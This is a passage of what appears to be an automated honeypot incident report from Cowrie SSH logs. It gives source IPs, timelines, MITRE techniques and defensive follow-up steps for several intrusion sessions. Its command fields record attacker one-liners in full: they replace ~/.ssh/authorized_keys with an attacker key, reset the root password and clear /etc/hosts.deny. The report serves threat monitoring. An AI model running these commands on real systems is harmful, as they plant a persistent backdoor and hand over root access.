| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OA9SygqybiOC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:23:01` | `cowrie.session.connect` |
| `2026-06-01 14:23:01` | `cowrie.client.version` |
| `2026-06-01 14:23:01` | `cowrie.client.kex` |
| `2026-06-01 14:23:02` | `cowrie.login.success` |
| `2026-06-01 14:23:02` | `cowrie.session.params` |
| `2026-06-01 14:23:02` | `cowrie.command.input` |
| `2026-06-01 14:23:02` | `cowrie.command.failed` |
| `2026-06-01 14:23:03` | `cowrie.log.closed` |
| `2026-06-01 14:23:03` | `cowrie.session.params` |
| `2026-06-01 14:23:03` | `cowrie.command.input` |
| `2026-06-01 14:23:03` | `cowrie.session.file_download` |
| `2026-06-01 14:23:03` | `cowrie.log.closed` |
| `2026-06-01 14:23:13` | `cowrie.session.params` |
| `2026-06-01 14:23:13` | `cowrie.command.input` |
| `2026-06-01 14:23:14` | `cowrie.log.closed` |
| `2026-06-01 14:23:14` | `cowrie.session.params` |
| `2026-06-01 14:23:14` | `cowrie.command.input` |
| `2026-06-01 14:23:14` | `cowrie.log.closed` |
| `2026-06-01 14:23:14` | `cowrie.session.params` |
| `2026-06-01 14:23:14` | `cowrie.command.input` |
| `2026-06-01 14:23:14` | `cowrie.session.file_download` |
| `2026-06-01 14:23:14` | `cowrie.log.closed` |
| `2026-06-01 14:23:15` | `cowrie.session.params` |
| `2026-06-01 14:23:15` | `cowrie.command.input` |
| `2026-06-01 14:23:15` | `cowrie.log.closed` |
| `2026-06-01 14:23:15` | `cowrie.session.params` |
| `2026-06-01 14:23:15` | `cowrie.command.input` |
| `2026-06-01 14:23:15` | `cowrie.log.closed` |
| `2026-06-01 14:23:16` | `cowrie.session.params` |
| `2026-06-01 14:23:16` | `cowrie.command.input` |
| `2026-06-01 14:23:16` | `cowrie.command.input` |
| `2026-06-01 14:23:16` | `cowrie.log.closed` |
| `2026-06-01 14:23:16` | `cowrie.session.params` |
| `2026-06-01 14:23:16` | `cowrie.command.input` |
| `2026-06-01 14:23:16` | `cowrie.log.closed` |
| `2026-06-01 14:23:16` | `cowrie.session.params` |
| `2026-06-01 14:23:16` | `cowrie.command.input` |
| `2026-06-01 14:23:17` | `cowrie.log.closed` |
| `2026-06-01 14:23:17` | `cowrie.session.params` |
| `2026-06-01 14:23:17` | `cowrie.command.input` |
| `2026-06-01 14:23:17` | `cowrie.log.closed` |
| `2026-06-01 14:23:17` | `cowrie.session.params` |
| `2026-06-01 14:23:17` | `cowrie.command.input` |
| `2026-06-01 14:23:18` | `cowrie.log.closed` |
| `2026-06-01 14:23:18` | `cowrie.session.params` |
| `2026-06-01 14:23:18` | `cowrie.command.input` |
| `2026-06-01 14:23:18` | `cowrie.log.closed` |
| `2026-06-01 14:23:18` | `cowrie.session.params` |
| `2026-06-01 14:23:18` | `cowrie.command.input` |
| `2026-06-01 14:23:18` | `cowrie.log.closed` |
| `2026-06-01 14:23:19` | `cowrie.session.params` |
| `2026-06-01 14:23:19` | `cowrie.command.input` |
| `2026-06-01 14:23:19` | `cowrie.log.closed` |
| `2026-06-01 14:23:19` | `cowrie.session.params` |
| `2026-06-01 14:23:19` | `cowrie.command.input` |
| `2026-06-01 14:23:19` | `cowrie.log.closed` |
| `2026-06-01 14:23:19` | `cowrie.session.params` |
| `2026-06-01 14:23:19` | `cowrie.command.input` |
| `2026-06-01 14:23:20` | `cowrie.log.closed` |
| `2026-06-01 14:23:20` | `cowrie.session.params` |
| `2026-06-01 14:23:20` | `cowrie.command.input` |
| `2026-06-01 14:23:20` | `cowrie.log.closed` |
| `2026-06-01 14:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a3b4bce89b8

| Field | Detail |
|---|---|
| **Source IP** | `59.26.132[.]170` |
| **First Seen** | 2026-06-01 14:25 |
| **Last Seen** | 2026-06-01 14:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:25:56` | `cowrie.session.connect` |
| `2026-06-01 14:25:56` | `cowrie.client.version` |
| `2026-06-01 14:25:56` | `cowrie.client.kex` |
| `2026-06-01 14:25:57` | `cowrie.login.success` |
| `2026-06-01 14:25:57` | `cowrie.session.params` |
| `2026-06-01 14:25:57` | `cowrie.command.input` |
| `2026-06-01 14:25:57` | `cowrie.command.failed` |
| `2026-06-01 14:25:58` | `cowrie.log.closed` |
| `2026-06-01 14:25:58` | `cowrie.session.params` |
| `2026-06-01 14:25:58` | `cowrie.command.input` |
| `2026-06-01 14:25:58` | `cowrie.session.file_download` |
| `2026-06-01 14:25:58` | `cowrie.log.closed` |
| `2026-06-01 14:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.26.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `59.26.132[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-556a573d9346

| Field | Detail |
|---|---|
| **Source IP** | `59.26.132[.]170` |
| **First Seen** | 2026-06-01 14:26 |
| **Last Seen** | 2026-06-01 14:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:26:01` | `cowrie.session.connect` |
| `2026-06-01 14:26:01` | `cowrie.client.version` |
| `2026-06-01 14:26:01` | `cowrie.client.kex` |
| `2026-06-01 14:26:01` | `cowrie.login.success` |
| `2026-06-01 14:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.26.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `59.26.132[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53b6cc8f918

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:30 |
| **Last Seen** | 2026-06-01 14:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:30:42` | `cowrie.session.connect` |
| `2026-06-01 14:30:42` | `cowrie.client.version` |
| `2026-06-01 14:30:42` | `cowrie.client.kex` |
| `2026-06-01 14:30:43` | `cowrie.login.success` |
| `2026-06-01 14:30:43` | `cowrie.session.params` |
| `2026-06-01 14:30:43` | `cowrie.command.input` |
| `2026-06-01 14:30:43` | `cowrie.command.failed` |
| `2026-06-01 14:30:43` | `cowrie.log.closed` |
| `2026-06-01 14:30:43` | `cowrie.session.params` |
| `2026-06-01 14:30:43` | `cowrie.command.input` |
| `2026-06-01 14:30:43` | `cowrie.session.file_download` |
| `2026-06-01 14:30:43` | `cowrie.log.closed` |
| `2026-06-01 14:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aa5ad67d3eb

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:30 |
| **Last Seen** | 2026-06-01 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:30:46` | `cowrie.session.connect` |
| `2026-06-01 14:30:46` | `cowrie.client.version` |
| `2026-06-01 14:30:46` | `cowrie.client.kex` |
| `2026-06-01 14:30:46` | `cowrie.login.success` |
| `2026-06-01 14:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961d6951323a

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:34 |
| **Last Seen** | 2026-06-01 14:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:34:33` | `cowrie.session.connect` |
| `2026-06-01 14:34:33` | `cowrie.client.version` |
| `2026-06-01 14:34:33` | `cowrie.client.kex` |
| `2026-06-01 14:34:34` | `cowrie.login.success` |
| `2026-06-01 14:34:34` | `cowrie.session.params` |
| `2026-06-01 14:34:34` | `cowrie.command.input` |
| `2026-06-01 14:34:34` | `cowrie.command.failed` |
| `2026-06-01 14:34:34` | `cowrie.log.closed` |
| `2026-06-01 14:34:34` | `cowrie.session.params` |
| `2026-06-01 14:34:34` | `cowrie.command.input` |
| `2026-06-01 14:34:35` | `cowrie.session.file_download` |
| `2026-06-01 14:34:35` | `cowrie.log.closed` |
| `2026-06-01 14:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc2fef59730

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:34 |
| **Last Seen** | 2026-06-01 14:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:34:42` | `cowrie.session.connect` |
| `2026-06-01 14:34:42` | `cowrie.client.version` |
| `2026-06-01 14:34:42` | `cowrie.client.kex` |
| `2026-06-01 14:34:42` | `cowrie.login.success` |
| `2026-06-01 14:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0c10cae186

| Field | Detail |
|---|---|
| **Source IP** | `101.126.141[.]163` |
| **First Seen** | 2026-06-01 14:54 |
| **Last Seen** | 2026-06-01 14:55 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:COSLR8t34puY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:54:51` | `cowrie.session.connect` |
| `2026-06-01 14:54:51` | `cowrie.client.version` |
| `2026-06-01 14:54:51` | `cowrie.client.kex` |
| `2026-06-01 14:54:53` | `cowrie.login.success` |
| `2026-06-01 14:54:53` | `cowrie.session.params` |
| `2026-06-01 14:54:53` | `cowrie.command.input` |
| `2026-06-01 14:54:53` | `cowrie.command.failed` |
| `2026-06-01 14:54:53` | `cowrie.log.closed` |
| `2026-06-01 14:54:53` | `cowrie.session.params` |
| `2026-06-01 14:54:53` | `cowrie.command.input` |
| `2026-06-01 14:54:54` | `cowrie.session.file_download` |
| `2026-06-01 14:54:54` | `cowrie.log.closed` |
| `2026-06-01 14:55:24` | `cowrie.session.params` |
| `2026-06-01 14:55:24` | `cowrie.command.input` |
| `2026-06-01 14:55:24` | `cowrie.log.closed` |
| `2026-06-01 14:55:24` | `cowrie.session.params` |
| `2026-06-01 14:55:24` | `cowrie.command.input` |
| `2026-06-01 14:55:24` | `cowrie.log.closed` |
| `2026-06-01 14:55:25` | `cowrie.session.params` |
| `2026-06-01 14:55:25` | `cowrie.command.input` |
| `2026-06-01 14:55:25` | `cowrie.session.file_download` |
| `2026-06-01 14:55:25` | `cowrie.log.closed` |
| `2026-06-01 14:55:26` | `cowrie.session.params` |
| `2026-06-01 14:55:26` | `cowrie.command.input` |
| `2026-06-01 14:55:26` | `cowrie.log.closed` |
| `2026-06-01 14:55:27` | `cowrie.session.params` |
| `2026-06-01 14:55:27` | `cowrie.command.input` |
| `2026-06-01 14:55:27` | `cowrie.log.closed` |
| `2026-06-01 14:55:28` | `cowrie.session.params` |
| `2026-06-01 14:55:28` | `cowrie.command.input` |
| `2026-06-01 14:55:28` | `cowrie.command.input` |
| `2026-06-01 14:55:28` | `cowrie.log.closed` |
| `2026-06-01 14:55:28` | `cowrie.session.params` |
| `2026-06-01 14:55:28` | `cowrie.command.input` |
| `2026-06-01 14:55:28` | `cowrie.log.closed` |
| `2026-06-01 14:55:29` | `cowrie.session.params` |
| `2026-06-01 14:55:29` | `cowrie.command.input` |
| `2026-06-01 14:55:29` | `cowrie.log.closed` |
| `2026-06-01 14:55:30` | `cowrie.session.params` |
| `2026-06-01 14:55:30` | `cowrie.command.input` |
| `2026-06-01 14:55:30` | `cowrie.log.closed` |
| `2026-06-01 14:55:30` | `cowrie.session.params` |
| `2026-06-01 14:55:30` | `cowrie.command.input` |
| `2026-06-01 14:55:30` | `cowrie.log.closed` |
| `2026-06-01 14:55:31` | `cowrie.session.params` |
| `2026-06-01 14:55:31` | `cowrie.command.input` |
| `2026-06-01 14:55:31` | `cowrie.log.closed` |
| `2026-06-01 14:55:32` | `cowrie.session.params` |
| `2026-06-01 14:55:32` | `cowrie.command.input` |
| `2026-06-01 14:55:32` | `cowrie.log.closed` |
| `2026-06-01 14:55:32` | `cowrie.session.params` |
| `2026-06-01 14:55:32` | `cowrie.command.input` |
| `2026-06-01 14:55:33` | `cowrie.log.closed` |
| `2026-06-01 14:55:33` | `cowrie.session.params` |
| `2026-06-01 14:55:33` | `cowrie.command.input` |
| `2026-06-01 14:55:34` | `cowrie.log.closed` |
| `2026-06-01 14:55:34` | `cowrie.session.params` |
| `2026-06-01 14:55:34` | `cowrie.command.input` |
| `2026-06-01 14:55:35` | `cowrie.log.closed` |
| `2026-06-01 14:55:36` | `cowrie.session.params` |
| `2026-06-01 14:55:36` | `cowrie.command.input` |
| `2026-06-01 14:55:36` | `cowrie.log.closed` |
| `2026-06-01 14:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.141[.]163` to AbuseIPDB if not already reported
- [ ] Block `101.126.141[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad8bdd72f58

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 14:58 |
| **Last Seen** | 2026-06-01 14:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:58:52` | `cowrie.session.connect` |
| `2026-06-01 14:58:52` | `cowrie.client.version` |
| `2026-06-01 14:58:53` | `cowrie.client.kex` |
| `2026-06-01 14:58:54` | `cowrie.login.success` |
| `2026-06-01 14:58:55` | `cowrie.session.params` |
| `2026-06-01 14:58:55` | `cowrie.command.input` |
| `2026-06-01 14:58:55` | `cowrie.command.failed` |
| `2026-06-01 14:58:56` | `cowrie.log.closed` |
| `2026-06-01 14:58:56` | `cowrie.session.params` |
| `2026-06-01 14:58:56` | `cowrie.command.input` |
| `2026-06-01 14:58:57` | `cowrie.session.file_download` |
| `2026-06-01 14:58:57` | `cowrie.log.closed` |
| `2026-06-01 14:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c136764f87

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 14:59 |
| **Last Seen** | 2026-06-01 14:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:59:01` | `cowrie.session.connect` |
| `2026-06-01 14:59:01` | `cowrie.client.version` |
| `2026-06-01 14:59:01` | `cowrie.client.kex` |
| `2026-06-01 14:59:03` | `cowrie.login.success` |
| `2026-06-01 14:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c7f31e025ff

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:00 |
| **Last Seen** | 2026-06-01 15:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:00:42` | `cowrie.session.connect` |
| `2026-06-01 15:00:42` | `cowrie.client.version` |
| `2026-06-01 15:00:43` | `cowrie.client.kex` |
| `2026-06-01 15:00:44` | `cowrie.login.success` |
| `2026-06-01 15:00:45` | `cowrie.session.params` |
| `2026-06-01 15:00:45` | `cowrie.command.input` |
| `2026-06-01 15:00:45` | `cowrie.command.failed` |
| `2026-06-01 15:00:46` | `cowrie.log.closed` |
| `2026-06-01 15:00:46` | `cowrie.session.params` |
| `2026-06-01 15:00:46` | `cowrie.command.input` |
| `2026-06-01 15:00:47` | `cowrie.session.file_download` |
| `2026-06-01 15:00:47` | `cowrie.log.closed` |
| `2026-06-01 15:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1f9e3ceb40

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:00 |
| **Last Seen** | 2026-06-01 15:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:00:51` | `cowrie.session.connect` |
| `2026-06-01 15:00:51` | `cowrie.client.version` |
| `2026-06-01 15:00:51` | `cowrie.client.kex` |
| `2026-06-01 15:00:53` | `cowrie.login.success` |
| `2026-06-01 15:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c7a991a8b8a

| Field | Detail |
|---|---|
| **Source IP** | `120.1.87[.]115` |
| **First Seen** | 2026-06-01 15:07 |
| **Last Seen** | 2026-06-01 15:08 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
